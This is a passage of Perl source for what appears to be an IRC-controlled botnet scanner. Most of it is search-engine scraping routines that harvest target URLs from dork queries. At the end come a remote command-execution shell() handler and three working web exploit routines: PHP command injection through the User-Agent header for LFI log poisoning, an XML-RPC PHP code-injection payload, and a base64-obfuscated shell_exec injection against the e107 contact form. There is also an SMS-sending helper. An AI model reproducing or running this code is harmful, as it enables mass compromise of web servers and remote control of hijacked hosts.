    for (my $i=0; $i<=500; $i+=10) {
        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {
            if ($1 !~ /rediff\.com/){
            my $link = $1;
				my @grep = &links($link);
				push(@list,@grep);
			}
        }
    }
    return @list;
}

sub uol() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".&key($key)."&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
            if ($1 !~ /uol\.com/) {
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$i."&FORM=PERE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /bing\.com/) {
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub altavista() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10){
        my $search = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".&key($key)."&stq=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<span class=ngrn>(.+?)\//g) {
            if ($1 !~ /altavista/){
            my $link = $1;
                $link =~ s/<//g;
                $link =~ s/ //g;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub ask() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=50; $i+=1) {
        my $search = ("http://it.ask.com/web?q=".&key($key)."&qsrc=0&o=0&l=dir&qid=EE90DE6E8F5370F363A63EC61228D4FE&page=".$i."&jss=1&dm=all");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=\"/g) {
            if ($1 !~ /ask\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahoo(){
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.yahoo.com/search?p=".&key($key)."&b=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            if ($1 !~ /yahoo\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub clusty() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=500; $b+=10) {
        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");
        my $res = &search_engine_query($search);
        while ($res =~ m/<div class=\"document-header\"><a href=\"http:\/\/(.*?)\"><span class=\"title\">/g) {
            if ($1 !~ /yippy\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gutser() {
    my @list;
    my $key = $_[0];
    for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://www.goodsearch.com/Search.aspx?Keywords=".&key($key)."&page=".$b."&osmax=0");
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/([^>\"]*)\">/g) {
            if ($1 !~ /goodsearch|good\.is|w3\.org|quantserve/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub google2() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @doms = ("ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");
foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];
    for ($b=1; $b<=200; $b+=10) {
        my $search = ("http://www.google.".$dom."/search?num=50&q=".&key($key)."&start=".$b."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /google/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    } return @list;
}
}

sub exalead() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a class=\"thumbnail\" href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /exalead/){
                my @grep = &links($link);
                push(@list,@grep);
            }
            }
        }
    return @list;	
}	

sub lycos() { 
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.lycos.com/?query=".&key($key)."&page2=".$b."&tab=web&searchArea=web&diktfc=468007302EF7DB9AFE53D4138B848E7B4000D424385F");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmouseover=/g) {
            if ($1 !~ /lycos\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub virgilio() {
  my @list;
  my $key = $_[0];
    for ($b=10; $b<=500; $b+=10) {
        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".&key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" target=\"/g) {
            if ($1 !~ /\.virgilio\.it/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub webde() {
  my @list;
  my $key = $_[0];
    for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".&key($key)."&search=Suche&webRb=countryDE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g) {
            my $link = $1;
            if ($link!~ /suche|web/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub hotbot() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
        my $res = &search_engine_query($search);
        while ($res =~ m/rel=\"nofollow\" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /hotbot\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub aol() {
  my @list;
  my $key = $_[0];
    for ($b=2; $b<=50; $b+=1) {
        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" property/g) {
            if ($1 !~ /aol\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub sapo(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            if ($1 !~ /\.sapo\.pt/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub duck() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://duckduckgo.com/html/?q=".&key($key)."&t=A&l=en&p=1&s=".$b."&o=json&dc=".$b."&api=d.js");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /duckduckgo/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub lygo() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=lygo&page2=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"><img/g) {
            if ($1 !~ /hotbot\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yause() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<h1><a rel=\"nofollow\" href=\"http:\/\/(.+?)\" onfocus=/g) {
            if ($1 !~ /yauba\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub baidu() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://www.baidu.com/s?wd=".&key($key)."&pn=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/\" href=\"http:\/\/(.*?)\"  target=/g) {
            if ($1 !~ /baidu\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub kipot() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://www.qkport.com/".$b."/web/".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" target=\"_top\"/g) {
            if ($1 !~ /qkport\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gibla() { #mati#
	my @list;
	my $key = $_[0];
	my $hal = "/search?q=".&key($key);
    my $search = ("http://www.gigablast.com".$hal);
    my $res = &search_engine_query($search);
	while ($res =~ m/Next 10 Results/) {
        $search = ("http://www.gigablast.com".$hal);
        while ($res =~ m/<span class=\"url\">(.+?)><\/span>/g) {
            my $link = $1;
            if ($link!~ /gigablast/){
                my @grep = &links($link);
                push(@list,@grep);
			}
		} 
	if ($res =~ m/<center><a href=\"(.*?)\">/) { $hal = $1; }
	$res = &search_engine_query($search);
	}return @list;
}

sub black() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://blekko.com/ws/".&key($key)."?ft=&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/class=\"UrlTitleLine\" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /blekko/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub onet() { 
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /webcache|query/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub sizuka() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=500; $b+=10) {
        my $search = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&q=".&key($key)."&start=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a title=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /szukacz/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub walla() { 
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.walla.co.il/?t=0&e=utf&q=".&key($key)."&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<td class=sw><a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /walla\.co\.il/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub demos() { 
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://search.dmoz.org/search/search?q=".&key($key)."&start=".$b."&type=next&all=yes");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /search|dmoz/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rose() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @langs = ("de","nl","fi","ps","da","en","es","fr","it","no","sv","cs","pl","ru");
foreach my $language (@langs) { $lang = $langs[rand(scalar(@langs))];
    for ($b=0; $b<=100; $b+=10) {
        my $search = ("http://euroseek.com/system/search.cgi?language=".$lang."&mode=internet&start=".$b."&string=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" class=/g) {
            if ($1 !~ /euroseek/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
}return @list;
}

sub seznam() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.seznam.cz/?q=".&key($key)."&count=10&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title/g) {
            if ($1 !~ /seznam/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub tiscali() { 
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onclick/g) {
            if ($1 !~ /tiscali/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub naver() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://web.search.naver.com/search.naver?where=webkr&query=".&key($key)."&docid=0&lang=all&f=&srcharea=all&st=s&fd=2&start=".$b."&display=10");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /naver/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}


#########################################

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/\?/\%3F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
	$dork =~ s/@/\%40/g;
	$dork =~ s/\[/\%5B/g;
	$dork =~ s/\]/\%5D/g;
	$dork =~ s/\?/\%3F/g;
	$dork =~ s/\=/\%3D/g;
	$dork =~ s/\|/\%7C/g;
    return $dork;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/$1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$link,$host,$hdir);
    return @list;
}

sub search_engine_query($) {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ($query eq "") { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
            my @pages = <$sock>;
            $page = "@pages";
            close($sock);
        };
    return $page;
}

#########################################

sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 2; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub sendSMS {

	my $no = $_[0];
	my $pesan = $_[1];

	my $site = "sms.eligiblestore.com";
	my $paths = "/";
	
	############open konrksi#############
	my $socksms = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$site",PeerPort=>"80");

	###############cek apakah koneksi berhasil###############
	if(!$socksms) {die("gak bisa akses $site port 80\r\n");}

	#############request data##############
	print $socksms "GET $paths http/1.1\r\n";
	print $socksms "Host: $site\r\n";
	print $socksms "Accept: */*\r\n";
	print $socksms "User-Agent: Mozilla Firefox\r\n";
	print $socksms "Connection: Close\r\n";
	print $socksms "\r\n";


	#############ambil data,masukan ke dalam ariable array##############
	my @data = <$socksms>;

	##################close socket###################
	close($socksms);

	#$data = join("",@data);
	#print $data;

								########ambil pertanyaan##########
	#@spertanyaan1 = split("jawab ini : ",$data);
		#print @pertanyaan1[1];
	#@spertanyaan2 = split(" =",@spertanyaan1[1]);
		#print @spertanyaan2[0];
	#@spertanyaan3 = split(" ",@spertanyaan2[0]);
		#print "angka1= ".@spertanyaan3[0]."\r\n";
		#print "angka2= ".@spertanyaan3[2]."\r\n";
	#$jawaban = @spertanyaan3[0]+@spertanyaan3[2];
		#print "jawaban = $jawaban\r\n";


		
		###################ambil marguardcode################
	#@sguard1 = split("name='mathguard_code' value='",$data);
		#print @sguard1[1];
	#@sguard2 = split("' /><br />",@sguard1[1]);
		#print @sguard2[0];
	#$sguard = @sguard2[0];

	############devinisikan data yg diperlukan#############
	$action = "/";
	$Phonenumbers = $no;
	$Text = $pesan;
	#$mathguard_answer = $jawaban;
	#$mathguard_code = $sguard;
	$via = "main";
	$TOMBOL = "Submit";

	#################buat data yg akan di post##############
#	$Post = "Phonenumbers=".$Phonenumbers."&Text=".$Text."&mathguard_answer=".$mathguard_answer."&mathguard_code=".$mathguard_code."&TOMBOL=".$TOMBOL;
	$Post = "sendtoext=".$Phonenumbers."&smstext=".$Text."&socket=".$via."&submit=".$TOMBOL;
	$panjang = length $Post;


	###############kirim sms###############
	$socksms = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$site",PeerPort=>"80");
	print $socksms "POST $action http/1.1\r\n";
	print $socksms "Host: $site\r\n";
	print $socksms "Accept: */*\r\n";
	print $socksms "User-Agent: Mozilla Firefox\r\n";
	print $socksms "Content-type: application/x-www-form-urlencoded\r\n";
	print $socksms "Content-length: ".$panjang."\r\n";
	print $socksms "Connection: Close\r\n\r\n";
	print $socksms $Post;

	@hasil = <$socksms>;
	close($socksms);

	$hasil = join("",@hasil);
	if($hasil=~ /SMS sent to/){
		return 1;
		
	}
	else{
		return 0;
	}
}

sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url  = $_[0];
my $cmd  = $_[1];
my $chan = $_[2];
my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(7);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
&msg("$chan","0,1(0LFI0)4 $1");
} else {
&msg("$chan","0,1(0LFI0)4 No Output");
}
}

sub cmdxml() {
my $jed  = $_[0];
my $dwa  = $_[1];
my $chan = $_[2];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'bamby';system('".$dwa."');echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
&msg("$chan","0,1(0XML0)4 $1");
} else {
&msg("$chan","0,1(0XML0)4 No Output");
}
}

sub cmde107() {
my $path  = $_[0];
my $code = $_[1];
my $chan  = $_[2];
my $codecmd = encode_base64($code);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"));';
    my $req = HTTP::Request->new(POST => $path);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
     $mydata = $1;
&msg("$chan","0,1(0E1070)4 $mydata");
}
else { &msg("$chan","0,1(0E1070)4 No Output"); }
}

